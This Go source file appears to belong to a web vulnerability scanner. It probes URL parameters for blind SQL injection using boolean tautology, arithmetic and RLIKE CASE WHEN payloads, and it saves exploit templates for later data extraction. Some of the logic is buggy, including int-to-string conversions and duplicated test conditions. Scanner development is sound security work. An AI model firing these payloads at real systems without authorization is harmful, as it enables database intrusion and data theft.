package sql

import (
	"glint/logger"
	"glint/pkg/layers"
	"glint/util"
	"math"
	"math/rand"
	"regexp"
	"strconv"
	"time"

	"github.com/valyala/fasthttp"
)

//此页面处理sql盲注

var letterFrequency = [...]int{
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 7, 0, 0, 0, 0, 0, 0, 49, 71, 49, 0, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 0, 0, 0, 0, 0, 0, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 18, 0, 116, 30, 64, 60, 218, 24, 34, 72, 105, 5, 16, 68, 56, 101, 127, 46, 0, 110, 123, 139, 57, 19, 44, 4, 35, 1, 0, 0, 0, 0, 0,
}

var DefaultProxy = ""
var cert string
var mkey string

const partitionOptimization = 2
const challenge = "haribol"

var poeRequests = 0

var DBMSList = []string{
	"MYSQL", "MSSQL", "POSTGRESQL", "ORACLE", "RAILS",
}
var prioDBMS = 0

var Counter = 0

var SQLI_CONSTS map[string]int

// Set up DBMS "constants"
func setDBMSConst() {
	SQLI_CONSTS = make(map[string]int)
	for _, v := range DBMSList {
		SQLI_CONSTS[v] = int(math.Pow(3, float64(Counter)))
		Counter++
	}
}

func getGlobelValue(key string) interface{} {
	return nil
}

//计算优先级
func calcDMBSPriorities() int {
	var val = 0
	for _, v := range DBMSList {
		b := getGlobelValue("sqli." + v)
		if b.(bool) {
			val += SQLI_CONSTS[v]
		}
	}
	return val
}

type InjectionResult struct {
	Value  string
	Result bool
}

type classBlindSQLInj struct {
	scheme                  string
	TargetUrl               string
	inputIndex              int
	variations              []string
	foundVulnOnVariation    bool
	scanningAnInternalIP    bool
	scanningATestWebsite    bool
	longDuration            float64
	shortDuration           float64
	isNumeric               bool
	isBase64                bool
	responseIsStable        bool
	origValue               string
	confirmInjectionHistory []InjectionResult
	lastJob                 LastJob
	origBody                interface{}
	origFeatures            layers.MFeatures //原始特征
	lastJobProof            interface{}
	proofExploitTemplate    string
	proofExploitVarIndex    int
	proofExploitExploitType int
	trueFeatures            layers.MFeatures
	originalFullResponse    bool
	disableSensorBased      bool
	layer                   layers.Plreq
	origStatusCode          int
	responseTimingIsStable  bool
	inputIsStable           bool
	// sess                    *fastreq.Session
	// method                  string
}

type LastJob struct {
	request          *fasthttp.Request
	response         *fasthttp.Response
	responseDuration time.Duration
}

func (bsql *classBlindSQLInj) Init() {
	// sess := fastreq.GetSessionByOptions(
	// 	&fastreq.ReqOptions{
	// 		Timeout:       5,
	// 		AllowRedirect: true,
	// 		Proxy:         DefaultProxy,
	// 		Cert:          cert,
	// 		PrivateKey:    mkey,
	// 	})
	// bsql.sess = sess
}

func (bsql *classBlindSQLInj) filterBody(body string, testValue string) string {
	reg1 := regexp.MustCompile(`([0-1]?[0-9]|[2][0-3]):([0-5][0-9])[.|:]([0-9][0-9])`)
	body1 := reg1.ReplaceAllString(body, "")
	reg2 := regexp.MustCompile(`time\s*[:]\s*\d+\.?\d*`)
	body2 := reg2.ReplaceAllString(body1, "")
	// if testValue is provided it needs to be removed from the response
	// if testValue != "" {
	// 	str := strings.Replace(body, testValue, "")
	// }

	return body2
}

func (bsql *classBlindSQLInj) checkIfResponseIsStable(varIndex int) bool {
	var Time1 time.Duration
	var Time2 time.Duration
	var Time3 time.Duration
	s := time.Now()
	Feature, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, bsql.origValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	Time1 = time.Since(s)
	//发送目标值
	body1 := bsql.filterBody(Feature.Response.String(), bsql.origValue)
	body1Features := Feature
	bsql.origBody = body1
	bsql.origFeatures = Feature
	bsql.lastJob.responseDuration = Time1
	// 发送一些值 (查看回复是否不同)
	// bsql.origMessage = bsql.Response.msg3
	bsql.origStatusCode = Feature.Response.StatusCode()
	s2 := time.Now()
	Feature2, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, bsql.origValue)
	Time2 = time.Since(s2)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	body2 := bsql.filterBody(Feature2.Response.String(), bsql.origValue)
	body2Features := Feature2

	min := math.Min(Time1.Seconds(), Time2.Seconds())
	max := math.Max(Time1.Seconds(), Time2.Seconds())

	bsql.shortDuration = math.Max(bsql.shortDuration, Time2.Seconds())
	bsql.longDuration = bsql.shortDuration * 2
	if max-min > bsql.shortDuration {
		bsql.responseTimingIsStable = false
	} else {
		bsql.responseTimingIsStable = true
	}
	if body2 != body1 {
		bsql.responseIsStable = false
		return true
	} else {
		bsql.responseIsStable = true
	}
	//检测是否为空响应
	if len(body1) == 0 {
		logger.Debug("input is not stable, the body length is zero.")
		bsql.inputIsStable = false
		return true
	}
	//发送错误的值
	s3 := time.Now()
	newValue := util.RandStr(8)
	Feature3, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, newValue)
	Time3 = time.Since(s3)
	if err != nil {
		logger.Error("%s", err.Error())
		return false
	}
	body3Features := Feature3

	min = math.Min(min, Time3.Seconds())
	max = math.Max(max, Time3.Seconds())
	if max-min > bsql.shortDuration {
		bsql.responseTimingIsStable = false
	} else {
		bsql.responseTimingIsStable = true
	}
	bsql.shortDuration = math.Floor(bsql.shortDuration)
	bsql.longDuration = math.Floor(bsql.longDuration)

	if bsql.longDuration > 10 {
		bsql.responseTimingIsStable = false
	}

	logger.Debug("adjusted shortDuration: %.2f", bsql.shortDuration)
	logger.Debug("adjusted longDuration: %.2f", bsql.longDuration)
	// check if the input is stable
	if layers.CompareFeatures(&[]layers.MFeatures{body1Features}, &[]layers.MFeatures{body2Features}) &&
		layers.CompareFeatures(&[]layers.MFeatures{body1Features}, &[]layers.MFeatures{body3Features}) {
		bsql.inputIsStable = true
		logger.Debug("input is stable. good")
	} else {
		bsql.inputIsStable = false
	}

	return false

}

func (bsql *classBlindSQLInj) addToConfirmInjectionHistory(Value string, result bool) {
	bsql.confirmInjectionHistory = append(bsql.confirmInjectionHistory, InjectionResult{Value: Value, Result: result})
}

func (bsql *classBlindSQLInj) confirmInjectionWithOR(varIndex int,
	quoteChar string, confirmed bool, dontCommentRestOfQuery bool) bool {
	// original value
	bsql.origValue = "-1"
	origValue := bsql.origValue
	randNum := rand.Intn(1000)
	paramValue := bsql.origValue
	randString := string(randNum)
	if confirmed {
		randString = `000` + randString
	}
	// equalitySign := "="
	// test 1 TRUE  -------------------------------------------------------------
	paramValue = origValue + quoteChar + " OR 2+" + randString + "-" + randString + "-1=0+0+0+1 -- "
	if dontCommentRestOfQuery {
		paramValue = paramValue[:len(paramValue)-4]
	}
	logger.Debug("paramValue:%s", paramValue)

	testbody, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	if layers.CompareFeatures(&[]layers.MFeatures{testbody}, &[]layers.MFeatures{bsql.origFeatures}) {
		logger.Debug("failed OR test 1")
		return false
	}
	bsql.addToConfirmInjectionHistory(paramValue, true)
	truebody := testbody

	// test 2 False -------------------------------------------------------------
	paramValue = origValue + quoteChar + " OR 3*2>(0+5+" + randString + "-" + randString + ") -- "
	if dontCommentRestOfQuery {
		paramValue = paramValue[:len(paramValue)-4]
	}
	logger.Debug("paramValue:%s", paramValue)

	testbody1, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	if layers.CompareFeatures(&[]layers.MFeatures{testbody1}, &[]layers.MFeatures{truebody}) {
		logger.Debug("failed OR test 2")
		return false
	}

	bsql.addToConfirmInjectionHistory(paramValue, false)
	// test 3 False -------------------------------------------------------------
	paramValue = origValue + quoteChar + " OR 3*2<(0+5+" + randString + "-" + randString + ") -- "
	if dontCommentRestOfQuery {
		paramValue = paramValue[:len(paramValue)-4]
	}
	logger.Debug("paramValue:%s", paramValue)

	testbody2, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	if layers.CompareFeatures(&[]layers.MFeatures{testbody2}, &[]layers.MFeatures{truebody}) {
		logger.Debug("failed OR test 3")
		return false
	}
	bsql.addToConfirmInjectionHistory(paramValue, false)
	// test 4 true -------------------------------------------------------------
	paramValue = origValue + quoteChar + " OR 3*2<(0+5+" + randString + "-" + randString + ") -- "
	if dontCommentRestOfQuery {
		paramValue = paramValue[:len(paramValue)-4]
	}
	logger.Debug("paramValue:%s", paramValue)

	testbody3, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	if !layers.CompareFeatures(&[]layers.MFeatures{testbody3}, &[]layers.MFeatures{truebody}) {
		logger.Debug("failed OR test 4")
		return false
	}
	bsql.addToConfirmInjectionHistory(paramValue, true)
	// here are the more complex tests

	// test 5 TRUE-------------------------------------------------------------
	paramValue = origValue + quoteChar + " OR 2+1-1-1=1 AND " + randString + "=" + randString + " -- "
	if dontCommentRestOfQuery {
		paramValue = paramValue[:len(paramValue)-4]
	}
	logger.Debug("paramValue:%s", paramValue)

	testbody4, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	truebody = testbody4

	// test 6 false -------------------------------------------------------------
	paramValue = origValue + quoteChar + " OR 2+1-1+1=1 AND " + randString + "=" + randString + " -- "
	if dontCommentRestOfQuery {
		paramValue = paramValue[:len(paramValue)-4]
	}
	logger.Debug("paramValue:%s", paramValue)

	testbody5, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	if layers.CompareFeatures(&[]layers.MFeatures{testbody5}, &[]layers.MFeatures{truebody}) {
		logger.Debug("failed complex test 2")
		return false
	}
	bsql.addToConfirmInjectionHistory(paramValue, false)

	// test 7  FALSE  -------------------------------------------------------------
	paramValue = origValue + quoteChar + " OR 3*2=5 AND " + randString + "=" + randString + " -- "
	if dontCommentRestOfQuery {
		paramValue = paramValue[:len(paramValue)-4]
	}
	logger.Debug("paramValue:%s", paramValue)

	testbody6, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	if layers.CompareFeatures(&[]layers.MFeatures{testbody6}, &[]layers.MFeatures{truebody}) {
		logger.Debug("failed complex test 3")
		return false
	}
	bsql.addToConfirmInjectionHistory(paramValue, false)
	// test 8 TRUE  -------------------------------------------------------------
	paramValue = origValue + quoteChar + " OR 3*2=6 AND " + randString + "=" + randString + " -- "
	if dontCommentRestOfQuery {
		paramValue = paramValue[:len(paramValue)-4]
	}
	logger.Debug("paramValue:%s", paramValue)

	testbody7, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	if !layers.CompareFeatures(&[]layers.MFeatures{testbody7}, &[]layers.MFeatures{truebody}) {
		logger.Debug("failed complex test 4")
		return false
	}
	bsql.addToConfirmInjectionHistory(paramValue, true)
	// test 9 false  -------------------------------------------------------------
	paramValue = origValue + quoteChar + " OR 3*2*0=6 AND " + randString + "=" + randString + " -- "
	if dontCommentRestOfQuery {
		paramValue = paramValue[:len(paramValue)-4]
	}
	logger.Debug("paramValue:%s", paramValue)

	testbody8, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	if layers.CompareFeatures(&[]layers.MFeatures{testbody8}, &[]layers.MFeatures{truebody}) {
		logger.Debug("failed complex test 4")
		return false

	}
	bsql.addToConfirmInjectionHistory(paramValue, false)
	// test 10 TRUE  -------------------------------------------------------------
	paramValue = origValue + quoteChar + " OR 3*2*1=6 AND " + randString + "=" + randString + " -- "
	if dontCommentRestOfQuery {
		paramValue = paramValue[:len(paramValue)-4]
	}
	logger.Debug("paramValue:%s", paramValue)

	testbody9, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	if !layers.CompareFeatures(&[]layers.MFeatures{testbody9}, &[]layers.MFeatures{truebody}) {
		logger.Debug("failed complex test 5")
		return false
	}
	bsql.addToConfirmInjectionHistory(paramValue, true)
	// save a template payload for proof of exploit
	bsql.proofExploitTemplate = origValue + quoteChar + " OR {query} AND " + randString + "=" + randString + " -- "
	if dontCommentRestOfQuery {
		bsql.proofExploitTemplate = bsql.proofExploitTemplate[:len(bsql.proofExploitTemplate)-4]
	}
	bsql.proofExploitVarIndex = varIndex
	bsql.proofExploitExploitType = 0 //0=boolean, 1=timing
	bsql.trueFeatures = truebody
	return true
}

func parseInt(s string) string {
	var number string
	regex := regexp.MustCompile(`[0-9]{1,}`)
	number = regex.FindString(s)
	return number
}

func (bsql *classBlindSQLInj) confirmInjection(varIndex int,
	quoteChar string, likeInjection bool, confirmed bool) bool {
	logger.Debug("confirmInjection %d , %s, %v", varIndex, quoteChar, confirmed)
	randNum := rand.Intn(1000)
	randString := util.RandStr(4)
	origValue := bsql.origValue
	origFeatures := bsql.origFeatures
	if confirmed {
		randString = `000` + randString
	}
	if bsql.isNumeric {
		randString = string(rune(randNum))
	}
	equalitySign := "="
	// like injection
	likeStr := ""
	if likeInjection {
		likeStr = `%`
		equalitySign = "!="
	}
	if bsql.isNumeric {
		origValueAsInt, err := strconv.Atoi(parseInt(bsql.origValue))
		if err != nil {
			logger.Error("%s", err.Error())
			return false
		}
		// test 1 TRUE  -------------------------------------------------------------
		paramValue := "1*" + origValue
		logger.Debug("%s", paramValue)
		testbody, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
		if err != nil {
			logger.Error("%s", err.Error())
		}
		if !layers.CompareFeatures(&[]layers.MFeatures{testbody}, &[]layers.MFeatures{origFeatures}) {
			logger.Debug("failed Number test 1")
			return false
		}
		bsql.addToConfirmInjectionHistory(paramValue, true)
		// test 2 FALSE  -------------------------------------------------------------
		paramValue = origValue + "*" + string(rune(randNum)) + "*" + string(rune((randNum - 5))) + "*0"
		logger.Debug("%s", paramValue)
		testbody1, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
		if err != nil {
			logger.Error("%s", err.Error())
		}
		if layers.CompareFeatures(&[]layers.MFeatures{testbody1}, &[]layers.MFeatures{origFeatures}) {
			logger.Debug("failed Number test 2")
			return false
		}
		bsql.addToConfirmInjectionHistory(paramValue, false)
		// test 3 TRUE  -------------------------------------------------------------
		paramValue = "(" + string((origValueAsInt + (randNum + 5))) + "-" + string(randNum) + "-5)"
		logger.Debug("%s", paramValue)
		testbody2, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
		if err != nil {
			logger.Error("%s", err.Error())
		}
		if !layers.CompareFeatures(&[]layers.MFeatures{testbody2}, &[]layers.MFeatures{origFeatures}) {
			logger.Debug("failed Number test 3")
			return false
		}
		bsql.addToConfirmInjectionHistory(paramValue, true)
		// test 4 TRUE  -------------------------------------------------------------
		paramValue = string(rune(origValueAsInt)) + "/1"
		logger.Debug("%s", paramValue)
		testbody3, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
		if err != nil {
			logger.Error("%s", err.Error())
		}
		if !layers.CompareFeatures(&[]layers.MFeatures{testbody3}, &[]layers.MFeatures{origFeatures}) {
			logger.Debug("failed Number test 4")
			return false
		}
		bsql.addToConfirmInjectionHistory(paramValue, true)
		// test 5 FALSE  -------------------------------------------------------------
		paramValue = string(rune(origValueAsInt)) + "/0"
		logger.Debug("%s", paramValue)
		testbody4, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
		if err != nil {
			logger.Error("%s", err.Error())
		}
		if layers.CompareFeatures(&[]layers.MFeatures{testbody4}, &[]layers.MFeatures{origFeatures}) {
			logger.Debug("failed Number test 5")
			return false
		}
		bsql.addToConfirmInjectionHistory(paramValue, false)
		// test 6 TRUE  -------------------------------------------------------------
		paramValue = string(rune(origValueAsInt)) + "/(3*2-5)"
		logger.Debug("%s", paramValue)
		testbody5, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
		if err != nil {
			logger.Error("%s", err.Error())
		}
		if !layers.CompareFeatures(&[]layers.MFeatures{testbody5}, &[]layers.MFeatures{origFeatures}) {
			logger.Debug("failed Number test 6")
			return false
		}
		bsql.addToConfirmInjectionHistory(paramValue, true)
		// save a template payload for proof of exploit
		bsql.proofExploitTemplate = "{query}"
		bsql.proofExploitVarIndex = varIndex
		bsql.proofExploitExploitType = 0 // 0=boolean, 1=timing
		bsql.trueFeatures = origFeatures
	} else {
		// some tests for strings
		// test 1 TRUE  -------------------------------------------------------------
		paramValue := origValue + likeStr + quoteChar + " AND 2*3*8=6*8 AND " +
			quoteChar + randString + quoteChar + equalitySign + quoteChar + randString + likeStr
		logger.Debug("%s", paramValue)
		testbody, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
		if err != nil {
			logger.Error("%s", err.Error())
		}
		if !layers.CompareFeatures(&[]layers.MFeatures{testbody}, &[]layers.MFeatures{origFeatures}) {
			logger.Debug("failed string test 1")
			return false
		}
		bsql.addToConfirmInjectionHistory(paramValue, true)
		// test 2 False  -------------------------------------------------------------
		paramValue = origValue + likeStr + quoteChar + " AND 2*3*8=6*9 AND " + quoteChar +
			randString + quoteChar + equalitySign + quoteChar + randString + likeStr
		logger.Debug("%s", paramValue)
		testbody1, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
		if err != nil {
			logger.Error("%s", err.Error())
		}
		if layers.CompareFeatures(&[]layers.MFeatures{testbody1}, &[]layers.MFeatures{origFeatures}) {
			logger.Debug("failed string test 2")
			return false
		}
		bsql.addToConfirmInjectionHistory(paramValue, false)
		// test 3 False  -------------------------------------------------------------
		paramValue = origValue + likeStr + quoteChar + " AND 3*3<(2*4) AND " + quoteChar + randString +
			quoteChar + equalitySign + quoteChar + randString + likeStr
		logger.Debug("%s", paramValue)
		testbody2, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
		if err != nil {
			logger.Error("%s", err.Error())
		}
		if layers.CompareFeatures(&[]layers.MFeatures{testbody2}, &[]layers.MFeatures{origFeatures}) {
			logger.Debug("failed string test 3")
			return false
		}
		bsql.addToConfirmInjectionHistory(paramValue, false)
		// test 4 TRUE  -------------------------------------------------------------
		paramValue = origValue + likeStr + quoteChar + " AND 3*3<(2*4) AND " + quoteChar + randString +
			quoteChar + equalitySign + quoteChar + randString + likeStr
		logger.Debug("%s", paramValue)
		testbody3, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
		if err != nil {
			logger.Error("%s", err.Error())
		}
		if layers.CompareFeatures(&[]layers.MFeatures{testbody3}, &[]layers.MFeatures{origFeatures}) {
			logger.Debug("failed string test 4")
			return false
		}
		bsql.addToConfirmInjectionHistory(paramValue, false)
		// test 5 TRUE  -------------------------------------------------------------
		paramValue = origValue + likeStr + quoteChar + " AND 3*2*0>=0 AND " + quoteChar + randString +
			quoteChar + equalitySign + quoteChar + randString + likeStr
		logger.Debug("%s", paramValue)
		testbody4, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
		if err != nil {
			logger.Error("%s", err.Error())
		}
		if !layers.CompareFeatures(&[]layers.MFeatures{testbody4}, &[]layers.MFeatures{origFeatures}) {
			logger.Debug("failed string test 5")
			return false
		}
		bsql.addToConfirmInjectionHistory(paramValue, true)

		// test 6 FALSE  -------------------------------------------------------------
		paramValue = origValue + likeStr + quoteChar + " AND 3*3*9<(2*4) AND " + quoteChar + randString +
			quoteChar + equalitySign + quoteChar + randString + likeStr
		logger.Debug("%s", paramValue)
		testbody5, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
		if err != nil {
			logger.Error("%s", err.Error())
		}
		if layers.CompareFeatures(&[]layers.MFeatures{testbody5}, &[]layers.MFeatures{origFeatures}) {
			logger.Debug("failed string test 6")
			return false
		}
		bsql.addToConfirmInjectionHistory(paramValue, false)
		bsql.proofExploitTemplate = origValue + likeStr + quoteChar + " AND {query} AND " + quoteChar + randString + quoteChar + equalitySign + quoteChar + randString + likeStr
		bsql.proofExploitVarIndex = varIndex
		bsql.proofExploitExploitType = 0 // 0=boolean, 1=timing
		bsql.trueFeatures = origFeatures
	}
	return true
}

func (bsql *classBlindSQLInj) confirmInjectionWithRLIKE(varIndex int,
	quoteChar string, likeInjection bool, confirmed bool) bool {
	origValue := bsql.origValue
	randNum := rand.Intn(1000)
	var paramValue string
	randString := string(rune(randNum))
	origFeatures := bsql.origFeatures
	if confirmed {
		randString = `000` + randString
	}
	// test 1 TRUE  -------------------------------------------------------------
	paramValue = origValue + quoteChar + " RLIKE (SELECT (CASE WHEN (" +
		randString + "=" + randString + ") THEN 1 ELSE 0x28 END)) -- "
	logger.Debug("%s", paramValue)
	testBody, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	if !layers.CompareFeatures(&[]layers.MFeatures{testBody}, &[]layers.MFeatures{origFeatures}) {
		logger.Debug("failed Like test 1")
		return false
	}
	bsql.addToConfirmInjectionHistory(paramValue, true)
	trueBody := testBody

	// test 2 FALSE  -------------------------------------------------------------
	paramValue = origValue + quoteChar + " RLIKE (SELECT (CASE WHEN (" +
		randString + "=" + randString + ") THEN 1 ELSE 0x28 END)) -- "
	logger.Debug("%s", paramValue)
	testBody2, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	if layers.CompareFeatures(&[]layers.MFeatures{testBody2}, &[]layers.MFeatures{trueBody}) {
		logger.Debug("failed Like test 2")
		return false
	}
	bsql.addToConfirmInjectionHistory(paramValue, false)

	// test 3 TRUE  -------------------------------------------------------------
	paramValue = origValue + quoteChar + " RLIKE (SELECT (CASE WHEN (" +
		randString + "=1*" + randString + ") THEN 1 ELSE 0x28 END)) -- "
	logger.Debug("%s", paramValue)
	testBody3, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	if !layers.CompareFeatures(&[]layers.MFeatures{testBody3}, &[]layers.MFeatures{trueBody}) {
		logger.Debug("failed Like test 3")
		return false
	}
	bsql.addToConfirmInjectionHistory(paramValue, true)

	// test 4 TRUE  -------------------------------------------------------------
	paramValue = origValue + quoteChar + " RLIKE (SELECT (CASE WHEN (0*" + randString +
		"=0*" + randString + ") THEN 1 ELSE 0x28 END)) -- "
	logger.Debug("%s", paramValue)
	testBody4, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	if !layers.CompareFeatures(&[]layers.MFeatures{testBody4}, &[]layers.MFeatures{trueBody}) {
		logger.Debug("failed Like test 4")
		return false
	}
	bsql.addToConfirmInjectionHistory(paramValue, true)
	// test 5 FALSE  -------------------------------------------------------------
	paramValue = origValue + quoteChar + " RLIKE (SELECT (CASE WHEN (0*" + randString +
		"=1*" + randString + ") THEN 1 ELSE 0x28 END)) -- "
	logger.Debug("%s", paramValue)
	testBody5, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	if layers.CompareFeatures(&[]layers.MFeatures{testBody5}, &[]layers.MFeatures{trueBody}) {
		logger.Debug("failed Like test 4")
		return false
	}
	bsql.addToConfirmInjectionHistory(paramValue, true)
	// test 6 TRUE  -------------------------------------------------------------
	paramValue = origValue + quoteChar + " RLIKE (SELECT (CASE WHEN (1+1-2+" +
		randString + "=2+2-4+" + randString + ") THEN 1 ELSE 0x28 END)) -- "
	logger.Debug("%s", paramValue)
	testBody6, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	if !layers.CompareFeatures(&[]layers.MFeatures{testBody6}, &[]layers.MFeatures{trueBody}) {
		logger.Debug("failed Like test 4")
		return false
	}
	bsql.addToConfirmInjectionHistory(paramValue, true)

	bsql.proofExploitTemplate = origValue + quoteChar + " RLIKE (SELECT (CASE WHEN ({query}) THEN 1 ELSE 0x28 END))-- "
	bsql.proofExploitVarIndex = varIndex
	bsql.proofExploitExploitType = 0 // 0=boolean, 1=timing
	bsql.trueFeatures = trueBody

	return true
}

func (bsql *classBlindSQLInj) confirmInjectionWithOR2(varIndex int,
	quoteChar string, confirmed bool) bool {
	bsql.origValue = "-1"
	origValue := bsql.origValue
	randnum := rand.Intn(1000)
	paramValue := bsql.origValue
	randString := string(randnum)
	origFeatures := bsql.origFeatures
	if confirmed {
		randString = `000` + randString
	}
	randStrLong := util.RandStr(8)

	randNum := string(randnum)
	equalitySign := "="
	// test 1 TRUE  -------------------------------------------------------------
	paramValue = origValue + quoteChar + " OR 2+" + randNum + "-" + randNum +
		"-1=0+0+0+1 or " + quoteChar + randStrLong + quoteChar + "=" + quoteChar
	logger.Debug("%s", paramValue)
	testBody, err := bsql.layer.RequestByIndex(varIndex, bsql.TargetUrl, paramValue)
	if err != nil {
		logger.Error("%s", err.Error())
	}
	if layers.CompareFeatures(&[]layers.MFeatures{testBody}, &[]layers.MFeatures{origFeatures}) {
		logger.Debug("failed Like test 1")
		return false
	}
	bsql.addToConfirmInjectionHistory(paramValue, true)

	return true
}
